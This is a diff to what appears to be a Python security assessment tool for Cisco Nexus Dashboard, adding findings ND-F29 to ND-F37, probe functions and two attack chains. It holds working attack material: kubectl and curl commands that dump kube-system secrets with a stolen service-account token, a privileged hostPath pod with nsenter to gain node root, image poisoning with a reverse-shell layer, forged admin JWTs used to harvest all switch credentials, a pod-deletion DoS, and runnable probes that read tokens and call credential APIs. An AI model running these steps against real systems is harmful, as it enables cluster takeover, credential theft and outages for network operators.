@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F28 (MEDIUM). 10 attack chains.
+Findings: ND-F01 (CRITICAL) through ND-F37 (MEDIUM). 12 attack chains.
 """
 
 import socket
@@ -950,6 +950,272 @@ FINDINGS = {
         "auth": "none",
         "chain": "K8s pod network access -> POST cruisecontrol.kafka.svc:19090/kafkacruisecontrol/admin -> disable Kafka self-healing",
     },
+    "ND-F29": {
+        "title": "Zot OCI Registry No Authentication — Unauthenticated Image Pull and Push",
+        "severity": "CRITICAL",
+        "component": "Zot OCI registry (zot namespace), hostNetwork: true, port from GetSystemPort('RegistryPort')",
+        "description": (
+            "The Zot OCI registry config.tpl contains only storage, http (TLS), and log blocks. "
+            "No 'auth' block is present. In Zot, omitting the auth block means the registry is fully "
+            "open: any client can pull (docker pull) or push (docker push) without credentials. "
+            "TLS IS enabled (server cert/key mounted from KMS), but authentication is absent — "
+            "TLS provides encryption only, not access control. The registry runs with hostNetwork: true "
+            "and listens on 0.0.0.0, making it reachable from any host-routable network. "
+            "The OCI repo root is /data/oci_repo (hostPath mount), containing ALL ND service images "
+            "including apigw, aaaserver, keyhole, kms, and all app containers. "
+            "An attacker can push a poisoned image to any tag, then trigger a container restart or "
+            "ND upgrade to execute arbitrary code in any ND service pod with its service account token."
+        ),
+        "registry_root": "/data/oci_repo",
+        "config_path": "helm/config.tpl in zot container",
+        "auth_block": None,
+        "network": "hostNetwork: true, address: 0.0.0.0",
+        "tls": "enabled (server cert from KMS path), no client cert required, no HTTP Basic/OIDC/ldap auth",
+        "impact": (
+            "Push poisoned image -> restart any ND service -> code exec in pod -> service account token "
+            "-> if cisco-ndfc/mso/nir pod: cluster-admin (ND-F30). If apigw pod: full traffic intercept. "
+            "If aaaserver/kms pod: PKI root takeover."
+        ),
+        "chain": "Zot no-auth -> push backdoored image tag -> restart target pod -> code exec -> service account cluster-admin (ND-F30)",
+    },
+    "ND-F30": {
+        "title": "system:appmgr ClusterRole — Cluster-Admin Equivalent RBAC Bound to All App Namespace Service Accounts",
+        "severity": "CRITICAL",
+        "component": "appmgr Helm chart (helm/templates/appmgr.tpl), ClusterRole system:appmgr, ClusterRoleBinding appmgr",
+        "description": (
+            "The system:appmgr ClusterRole defines rules: apiGroups: ['*'], resources: ['*'], verbs: ['*']. "
+            "This is mathematically identical to the built-in cluster-admin ClusterRole — every K8s API "
+            "operation on every resource type in every namespace is permitted. "
+            "The ClusterRoleBinding binds this role to four service account groups: "
+            "system:serviceaccounts:appmgr, system:serviceaccounts:cisco-ndfc, "
+            "system:serviceaccounts:cisco-mso, system:serviceaccounts:cisco-nir. "
+            "Every pod deployed into these four namespaces has a pre-mounted service account token at "
+            "/var/run/secrets/kubernetes.io/serviceaccount/token that carries cluster-admin. "
+            "These namespaces contain 60+ containers: all NDFC microservices, all MSO services, "
+            "all NIR telemetry services. Any code execution path in any of these pods grants "
+            "cluster-admin over the entire K8s cluster."
+        ),
+        "clusterrole_rules": [{"apiGroups": ["*"], "resources": ["*"], "verbs": ["*"]}],
+        "binding_subjects": [
+            "system:serviceaccounts:appmgr",
+            "system:serviceaccounts:cisco-ndfc",
+            "system:serviceaccounts:cisco-mso",
+            "system:serviceaccounts:cisco-nir",
+        ],
+        "exploit": (
+            "From any cisco-ndfc/mso/nir/appmgr pod: "
+            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); "
+            "curl -k https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets "
+            "-H 'Authorization: Bearer $TOKEN' -> lists kube-system secrets including etcd certs; "
+            "kubectl --token=$TOKEN create namespace pwned; "
+            "kubectl --token=$TOKEN create pod root --image=alpine --overrides='{spec:{hostPID:true,containers:[{securityContext:{privileged:true},volumeMounts:[{mountPath:/host,name:host}],volumes:[{hostPath:{path:/},name:host}]}]}}'  "
+            "-> nsenter -t 1 -m -u -i -n /bin/bash -> root on K8s node"
+        ),
+        "chain": "Code exec in any cisco-ndfc/mso/nir/appmgr pod -> pre-mounted SA token = cluster-admin -> kube-system secrets -> node root",
+        "combined_with": ["ND-F29", "ND-F03", "ND-F01"],
+    },
+    "ND-F31": {
+        "title": "MSO executionservice Hardcoded DEBUG Log Level — Fabric Push Operations Logged Verbosely",
+        "severity": "HIGH",
+        "component": "cisco-mso / msc-executionservice deployment (msc-executionservice.yml)",
+        "description": (
+            "The MSO executionservice deployment sets ENV_DEFAULT_LOG_LEVEL: 'debug' as a container env var, "
+            "and a separate ConfigMap sets loglevel: debug for the cisco-mso namespace. "
+            "The executionservice is responsible for executing MSO multi-site network policy pushes "
+            "to remote fabric controllers — it handles device credentials, fabric authentication tokens, "
+            "and inter-site provisioning commands. At DEBUG log level, fabric push operations including "
+            "credential material, API tokens, and policy payloads are written to pod logs. "
+            "These logs are accessible via: kubectl logs -n cisco-mso <msc-executionservice-pod> "
+            "or via the ND techsupport bundle (ND-F01 chain). "
+            "This is not a runtime-configurable log level — it is hardcoded in the deployment spec."
+        ),
+        "env_vars": {
+            "ENV_DEFAULT_LOG_LEVEL": "debug",
+        },
+        "configmap": {"namespace": "cisco-mso", "loglevel": "debug"},
+        "log_path": "/logs/cisco-mso/ (accessible via techsupport bundle, ND-F01)",
+        "chain": "ND-F01 techsupport bundle -> /logs/cisco-mso/executionservice* -> fabric push credentials in DEBUG logs",
+    },
+    "ND-F32": {
+        "title": "NDFC POAP Service in cisco-ndfc Namespace — Switch Provisioning Credentials in Debug Logs",
+        "severity": "HIGH",
+        "component": "cisco-ndfc / cmn-poap-svc (dcnm-poap-common.cisco-ndfc.svc:9443, dcnm-poap-data.cisco-ndfc.svc:9443)",
+        "description": (
+            "NDFC Power On Auto Provisioning (POAP) services expose three microservices: "
+            "dcnm-poap-data.cisco-ndfc.svc:9443, dcnm-poap-mgmt.cisco-ndfc.svc:9443, "
+            "dcnm-poap-common.cisco-ndfc.svc:9443. POAP is the zero-touch provisioning protocol "
+            "for Nexus switch onboarding — it handles switch initial credentials, SSH keys, "
+            "and bootstrap configurations. The NDFC configmap sets verbose logging for cmn-poap-svc, "
+            "and the service runs with access to NDFC device credential stores. "
+            "At debug log level, switch credentials (SSH username/password, SNMPv3 auth/priv keys) "
+            "written during POAP provisioning flows appear in pod logs. "
+            "POAP also listens on ports 443, 80, 69 (TFTP), and 22 (SSH) for switch connections, "
+            "creating SSRF/redirect opportunities from POAP to internal services."
+        ),
+        "services": {
+            "dcnm-poap-data": "cisco-ndfc.svc:9443",
+            "dcnm-poap-mgmt": "cisco-ndfc.svc:9443",
+            "dcnm-poap-common": "cisco-ndfc.svc:9443",
+        },
+        "protocols": ["HTTPS:443", "HTTP:80", "TFTP:69", "SSH:22"],
+        "log_path": "/logs/cisco-ndfc/cmn-poap-svc* (accessible via techsupport bundle, ND-F01)",
+        "chain": "ND-F01 techsupport bundle -> /logs/cisco-ndfc/cmn-poap-svc* -> switch bootstrap credentials in logs",
+    },
+    "ND-F33": {
+        "title": "NDFC LAN Switch Credential Retrieval API — All Fabric Device Credentials via Forged JWT",
+        "severity": "HIGH",
+        "component": "cisco-ndfc APIGW routes (cisco-dcnm-apigw-lan.yml), dcnm LAN config service",
+        "description": (
+            "NDFC exposes credential retrieval endpoints under /api/v1/rest/lanconfig/ that return "
+            "fabric switch credentials (SNMPv3, SSH, device passwords) to authenticated callers. "
+            "These endpoints are documented in gen-network-admin-privileges-crd.yml as requiring "
+            "network-admin role. All NDFC LAN APIGW routes use authType: jwt. "
+            "With a forged JWT carrying Domain-Admin role (ND-F25: RSA private key from KMS hostPath), "
+            "the Domain-Admin principal has network-admin-equivalent access and can call all credential "
+            "retrieval endpoints: /get/rest/lanconfig/getlanswitchcredentials, "
+            "/get/rest/lanconfig/getlanswitchcredentialswithtype, "
+            "/get/rest/lanconfig/getswitchwritecredential/switchid, "
+            "/get/rest/lanconfig/getrobotcredentials, /get/rest/lanconfig/getdefaultcredentials. "
+            "This returns SSH credentials, SNMP strings, and device passwords for every fabric switch "
+            "managed by NDFC — the complete device credential inventory."
+        ),
+        "endpoints": {
+            "getlanswitchcredentials": "GET /api/v1/rest/lanconfig/getlanswitchcredentials",
+            "getlanswitchcredentialswithtype": "GET /api/v1/rest/lanconfig/getlanswitchcredentialswithtype",
+            "getswitchwritecredential": "GET /api/v1/rest/lanconfig/getswitchwritecredential/switchid",
+            "getrobotcredentials": "GET /api/v1/rest/lanconfig/getrobotcredentials",
+            "getdefaultcredentials": "GET /api/v1/rest/lanconfig/getdefaultcredentials",
+            "getfabricswitchcredentials": "GET /api/v1/sancredential/getfabricswitchcredentials",
+        },
+        "auth_type": "jwt (authType: jwt on all NDFC LAN APIGW routes)",
+        "required_role": "network-admin (superseded by Domain-Admin from forged JWT)",
+        "chain": "ND-F25 forge JWT {role: Domain-Admin} -> GET /api/v1/rest/lanconfig/getlanswitchcredentials -> all fabric switch credentials",
+        "combined_with": ["ND-F25", "ND-F01", "ND-F03"],
+    },
+    "ND-F34": {
+        "title": "Dgraph Alpha No ACL Tokens — Unauthenticated GraphQL Queries via mTLS Client Cert",
+        "severity": "HIGH",
+        "component": "cisco-nir / dgraph-alpha-public.cisco-nir.svc ports 8080 (HTTP) and 9080 (gRPC)",
+        "description": (
+            "Dgraph Alpha is deployed as a single pod in cisco-nir namespace, "
+            "service dgraph-alpha-public.cisco-nir.svc on ports 8080 (HTTP/GraphQL) and 9080 (gRPC). "
+            "Dgraph startup args: ['start'] — no --security whitelist flag (IP allowlist) and "
+            "no --acl_secret_file (HMAC ACL token). Node TLS certs are mounted (server.key/crt, ca.crt) "
+            "providing transport security. Client-side: radix pod mounts "
+            "/home/app/client_credentials/dgraph/client.key and client.crt, indicating mTLS is required. "
+            "mTLS client certs are issued by the ND cluster CA managed by KMS etcd (ND-F03). "
+            "Via ND-F03 (etcd KMS CVE-2021-28235) -> extract all private keys -> forge valid ND client cert "
+            "-> present to dgraph-alpha-public:8080 -> unrestricted GraphQL schema enumeration, "
+            "data reads, and mutations. Dgraph without ACL tokens has no application-layer "
+            "authorization beyond TLS — any valid mTLS client can query or mutate all predicates."
+        ),
+        "service": "dgraph-alpha-public.cisco-nir.svc",
+        "ports": {"http_graphql": 8080, "grpc": 9080},
+        "image": "telemetry/dgraph:6.5.2.56",
+        "startup_args": ["start"],
+        "missing_flags": ["--security whitelist=<ip>", "--acl_secret_file=<path>"],
+        "mtls_required": True,
+        "mtls_bypass": "ND-F03 -> extract ND CA key from KMS etcd -> issue client cert matching ND CA",
+        "chain": "ND-F03 etcd KMS -> extract CA key -> forge mTLS client cert -> dgraph-alpha-public:8080 -> full NIR graph DB access",
+        "data_at_risk": "NIR telemetry graph: topology, flow analysis, security policy, device inventory",
+    },
+    "ND-F35": {
+        "title": "ND_INFRA_ACCESS_TOKEN Filesystem Path Exposed via NDFC ConfigMap — ND Core API Token Readable from NDFC Pods",
+        "severity": "HIGH",
+        "component": "cisco-ndfc configmap (cisco-dcnm-configmap.yml), all NDFC pods",
+        "description": (
+            "The NDFC ConfigMap cisco-dcnm sets ND_INFRA_ACCESS_TOKEN: "
+            "'/var/run/secrets/case.cncf.io/infra-access/access.token'. "
+            "This environment variable tells all NDFC services where to find the infra access token "
+            "used to authenticate NDFC->ND core API calls. The token is a projected service account "
+            "token mounted at that path in all NDFC pods. "
+            "From any code execution in a cisco-ndfc pod (via ND-F30 chain or direct vuln), "
+            "the token is readable: cat /var/run/secrets/case.cncf.io/infra-access/access.token. "
+            "This token authenticates as an internal ND service principal, bypassing user-level "
+            "authentication for ND core API endpoints that accept infra-access tokens. "
+            "Combined with ND-F30 (cluster-admin): enumerate all NDFC pod names -> exec into any -> "
+            "read infra token -> call ND core internal APIs directly."
+        ),
+        "env_var": "ND_INFRA_ACCESS_TOKEN",
+        "token_path": "/var/run/secrets/case.cncf.io/infra-access/access.token",
+        "token_type": "projected ServiceAccount token (case.cncf.io/infra-access audience)",
+        "also_exposed": "NDFC_NXCLOUD_USERNAME: ndfc-svc-nxcloud (cloud connector service identity)",
+        "chain": "Code exec in cisco-ndfc pod -> cat /var/run/secrets/case.cncf.io/infra-access/access.token -> call ND core infra APIs as NDFC service principal",
+        "combined_with": ["ND-F30", "ND-F29"],
+    },
+    "ND-F36": {
+        "title": "kubese-admission-webhook failurePolicy:Fail on All K8s Resource Types — Cluster-Wide Creation DoS",
+        "severity": "MEDIUM",
+        "component": "nd-core-infra helm (webhook.tpl), MutatingWebhookConfiguration kubese-admission-webhook",
+        "description": (
+            "The MutatingWebhookConfiguration 'kubese-admission-webhook' registers four webhooks "
+            "against kube-admission.kube-system.svc, all with failurePolicy: Fail. "
+            "Covered resources: namespaces + pods + podsecuritypolicies (CREATE/UPDATE), "
+            "persistentvolumeclaims (CREATE/UPDATE), deployments + statefulsets + replicasets + jobs "
+            "(CREATE/UPDATE), storageclasses (CREATE/UPDATE). "
+            "With failurePolicy: Fail, any webhook call that cannot reach the backend service "
+            "causes the API server to REJECT the resource operation. "
+            "If kube-admission.kube-system.svc is made unreachable (pod killed, service deleted, "
+            "or CrashLoopBackOff induced), ALL create/update operations for the above resource types "
+            "fail cluster-wide. No new pods, deployments, PVCs, or namespaces can be created. "
+            "An attacker with cluster-admin (ND-F30) can delete the kube-admission pod to trigger "
+            "a cluster-wide resource creation freeze."
+        ),
+        "webhook_name": "kubese-admission-webhook",
+        "backend_service": "kube-admission.kube-system.svc",
+        "failure_policy": "Fail",
+        "affected_resources": [
+            "namespaces, pods, podsecuritypolicies (CREATE, UPDATE)",
+            "persistentvolumeclaims (CREATE, UPDATE)",
+            "deployments, statefulsets, replicasets, jobs (CREATE, UPDATE)",
+            "storageclasses (CREATE, UPDATE)",
+        ],
+        "dos_path": (
+            "kubectl --token=<cluster-admin-token> delete pod "
+            "-n kube-system -l k8s-app=kubese-admission "
+            "-> kube-admission unreachable -> all resource creation/update rejected"
+        ),
+        "combined_with": ["ND-F30"],
+    },
+    "ND-F37": {
+        "title": "CockroachDB Backup Service Client Cert SAN 'root' — Root-Level Database Access for Backup Operations",
+        "severity": "MEDIUM",
+        "component": "cockroachdb helm (cockroachdb.tpl), cockroachdb-backup client cert, *.cockroachdb-lcl node wildcard SAN",
+        "description": (
+            "CockroachDB TLS client authentication maps the certificate CN or SAN to a database user. "
+            "The cockroachdb-backup client cert has CN: backup, SAN dnsnames: ['root']. "
+            "In CockroachDB, presenting client.backup.crt with SAN 'root' authenticates as the 'root' "
+            "database user — the built-in superuser with full DDL and DML access, no row-level security. "
+            "The cockroachdb-rootuser cert similarly has SAN 'root', granting root DB access. "
+            "Additionally, the CockroachDB node cert has SAN dnsnames: ['*.cockroachdb-lcl'], "
+            "a wildcard that allows any service presenting a cert matching this SAN to impersonate "
+            "a CockroachDB cluster node — enabling Raft log injection or cluster metadata manipulation. "
+            "Via ND-F03 (KMS etcd auth bypass) -> extract cockroachdb client cert private keys -> "
+            "connect to CockroachDB port 26257 as root -> full NDFC database access "
+            "(device inventory, fabric configs, credentials, user accounts)."
+        ),
+        "certs": {
+            "cockroachdb-backup": {
+                "cn": "backup",
+                "san_dnsnames": ["root"],
+                "files": {"cert": "client.bkpuser.crt", "key": "client.bkpuser.key"},
+                "effective_db_user": "root",
+            },
+            "cockroachdb-rootuser": {
+                "cn": "root",
+                "san_dnsnames": ["root"],
+                "files": {"cert": "client.root.crt", "key": "client.root.key"},
+                "effective_db_user": "root",
+            },
+            "node_cert": {
+                "san_dnsnames": ["localhost", "*.cockroachdb-lcl", "{{getAppInstanceService}}", "{{getAppInstanceService}}-lb"],
+                "wildcard_scope": "any hostname matching *.cockroachdb-lcl can impersonate a CockroachDB node",
+            },
+        },
+        "ports": {"sql_wire": 26257, "admin_http": 8088},
+        "chain": "ND-F03 etcd KMS -> extract client.root.key -> cockroach sql --certs-dir=. --host=cockroachdb.cisco-ndfc.svc:26257 -> full NDFC DB",
+        "combined_with": ["ND-F03", "ND-F30"],
+    },
 }
 
 
@@ -1650,6 +1916,104 @@ def probe_cruisecontrol_admin(host: str, namespace: str = "kafka", port: int = 1
     return result
 
 
+def probe_zot_registry_noauth(host: str, port: int = 5000, use_tls: bool = True) -> dict:
+    """
+    Test Zot OCI registry for unauthenticated access. ND-F29.
+    Attempts: GET /v2/ (catalog ping), GET /v2/_catalog (list repos), OCI image tag list.
+    """
+    scheme = "https" if use_tls else "http"
+    base = f"{scheme}://{host}:{port}"
+    result = {"finding": "ND-F29", "target": base, "endpoints": {}}
+    ssl_ctx = ssl.create_default_context()
+    ssl_ctx.check_hostname = False
+    ssl_ctx.verify_mode = ssl.CERT_NONE
+    for path in ["/v2/", "/v2/_catalog"]:
+        try:
+            req = urllib.request.Request(f"{base}{path}", headers={"Accept": "application/json"})
+            with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
+                body = resp.read().decode()[:500]
+                result["endpoints"][path] = {"status": resp.status, "body": body}
+        except urllib.error.HTTPError as e:
+            result["endpoints"][path] = {"status": e.code, "error": e.reason}
+        except Exception as e:
+            result["endpoints"][path] = {"error": str(e)[:120]}
+    result["unauth_pull"] = "/v2/" in result["endpoints"] and result["endpoints"]["/v2/"].get("status") == 200
+    result["catalog_readable"] = "/v2/_catalog" in result["endpoints"] and result["endpoints"]["/v2/_catalog"].get("status") == 200
+    return result
+
+
+def probe_cluster_admin_via_sa_token(token_path: str = "/var/run/secrets/kubernetes.io/serviceaccount/token") -> dict:
+    """
+    Read mounted service account token and attempt K8s API call to verify cluster-admin. ND-F30.
+    Must run from inside a cisco-ndfc/mso/nir/appmgr pod.
+    """
+    result = {"finding": "ND-F30", "token_path": token_path}
+    try:
+        with open(token_path, "r") as f:
+            token = f.read().strip()
+        result["token_present"] = True
+        result["token_length"] = len(token)
+        req = urllib.request.Request(
+            "https://kubernetes.default.svc/api/v1/namespaces",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        ssl_ctx = ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = ssl.CERT_NONE
+        with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
+            body = resp.read().decode()[:200]
+            result["namespaces_listed"] = resp.status == 200
+            result["body_preview"] = body
+        req2 = urllib.request.Request(
+            "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
+            headers={"Authorization": f"Bearer {token}"},
+        )
+        with urllib.request.urlopen(req2, timeout=5, context=ssl_ctx) as resp2:
+            result["kube_system_secrets_readable"] = resp2.status == 200
+            result["cluster_admin_confirmed"] = result["kube_system_secrets_readable"]
+    except (PermissionError, FileNotFoundError):
+        result["token_present"] = False
+    except urllib.error.HTTPError as e:
+        result["k8s_api_error"] = {"status": e.code, "reason": e.reason}
+    except Exception as e:
+        result["error"] = str(e)[:120]
+    return result
+
+
+def probe_ndfc_lanconfig_creds(host: str, jwt_token: str, port: int = 443) -> dict:
+    """
+    Attempt NDFC LAN switch credential retrieval with a JWT token. ND-F33.
+    jwt_token: forged JWT signed with ND RSA private key (from ND-F25).
+    """
+    base = f"https://{host}:{port}"
+    result = {"finding": "ND-F33", "target": base, "endpoints": {}}
+    ssl_ctx = ssl.create_default_context()
+    ssl_ctx.check_hostname = False
+    ssl_ctx.verify_mode = ssl.CERT_NONE
+    endpoints = [
+        "/api/v1/rest/lanconfig/getlanswitchcredentials",
+        "/api/v1/rest/lanconfig/getdefaultcredentials",
+        "/api/v1/rest/lanconfig/islancredentialsset",
+    ]
+    for path in endpoints:
+        try:
+            req = urllib.request.Request(
+                f"{base}{path}",
+                headers={"Authorization": f"Bearer {jwt_token}", "Accept": "application/json"},
+            )
+            with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
+                body = resp.read().decode()[:800]
+                result["endpoints"][path] = {"status": resp.status, "body": body}
+        except urllib.error.HTTPError as e:
+            result["endpoints"][path] = {"status": e.code, "error": e.reason}
+        except Exception as e:
+            result["endpoints"][path] = {"error": str(e)[:120]}
+    result["creds_accessible"] = any(
+        v.get("status") == 200 for v in result["endpoints"].values()
+    )
+    return result
+
+
 # ─── Attack Chain Summary ────────────────────────────────────────────────────
 
 
@@ -1796,6 +2160,51 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "ND-F01 world-readable cookie OR ND-F03 etcd noauth OR container escape",
         "findings": ["ND-F25", "ND-F01", "ND-F03", "ND-F27"],
+    },
+    "chain_11_zot_image_poison_cluster_takeover": {
+        "title": "Zot No-Auth Registry Image Push -> Pod Code Exec -> Cluster-Admin SA Token -> Cluster Takeover",
+        "steps": [
+            "1. ND-F29: Zot registry has no auth block -> docker pull <nd-host>:<RegistryPort>/apic-sn/apigw:latest",
+            "   Enumerate available images: GET https://<nd-host>:<port>/v2/_catalog",
+            "2. Pull target image, add reverse shell layer (alpine + busybox netcat):",
+            "   docker pull <nd-host>:<port>/apic-sn/cisco-ndfc/dcnm-server:latest",
+            "   docker build -t evil:1 . --build-arg BASE=<above>",
+            "   docker push <nd-host>:<port>/apic-sn/cisco-ndfc/dcnm-server:evil",
+            "3. Trigger image update: kubectl --token=<any-valid> set image deployment/dcnm-server dcnm-server=evil:1",
+            "   OR wait for ND upgrade cycle (upgrade-helper watches Zot for new tags)",
+            "4. New pod starts with poisoned image -> shell callback or key drop",
+            "5. Pod is in cisco-ndfc namespace -> service account token = cluster-admin (ND-F30)",
+            "   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+            "6. curl -k https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
+            "   -H 'Authorization: Bearer $TOKEN' -> all kube-system secrets",
+            "7. Extract etcd TLS certs, controller-manager kubeconfig -> node root",
+            "8. ND-F35: read /var/run/secrets/case.cncf.io/infra-access/access.token",
+            "   -> ND core API access as NDFC service principal",
+        ],
+        "entry_requirement": "Network reach to Zot registry port (host-routable, hostNetwork:true)",
+        "findings": ["ND-F29", "ND-F30", "ND-F35"],
+    },
+    "chain_12_fabric_credential_harvest": {
+        "title": "JWT RSA Key -> Forged Admin JWT -> NDFC Switch Credential API -> All Fabric Device Access",
+        "steps": [
+            "1. ND-F25: read /data/services/kms_etcd/keys/v1/se/rsa.priv -> JWT RSA-2048 private key",
+            "   (via ND-F01 techsupport bundle OR ND-F03 etcd KMS dump OR container escape)",
+            "2. Forge JWT: {'sub': 'admin', 'role': 'Domain-Admin', 'iss': 'nd-apigw', 'exp': far_future}",
+            "   signed RS256 with rsa.priv -> accepted by all APIGW authType:jwt endpoints",
+            "3. ND-F33: GET /api/v1/rest/lanconfig/getlanswitchcredentials",
+            "   Authorization: Bearer <forged-jwt>",
+            "   -> JSON response: all fabric switch SSH credentials, SNMP strings, device passwords",
+            "4. ND-F33: GET /api/v1/sancredential/getfabricswitchcredentials",
+            "   -> SAN fabric (FC switch) credentials",
+            "5. ND-F33: GET /api/v1/rest/lanconfig/getrobotcredentials",
+            "   -> automation/robot account credentials for all managed fabrics",
+            "6. SSH to each Nexus switch with harvested credentials -> full fabric control",
+            "7. ND-F31: MSO executionservice DEBUG logs -> fabric push operations in logs",
+            "   ND-F32: NDFC POAP DEBUG logs -> switch bootstrap credentials",
+            "   Combined: complete device credential set from three independent sources",
+        ],
+        "entry_requirement": "ND-F25 RSA key extraction (ND-F01 / ND-F03 / container escape)",
+        "findings": ["ND-F25", "ND-F33", "ND-F31", "ND-F32", "ND-F01"],
     },
 }
 
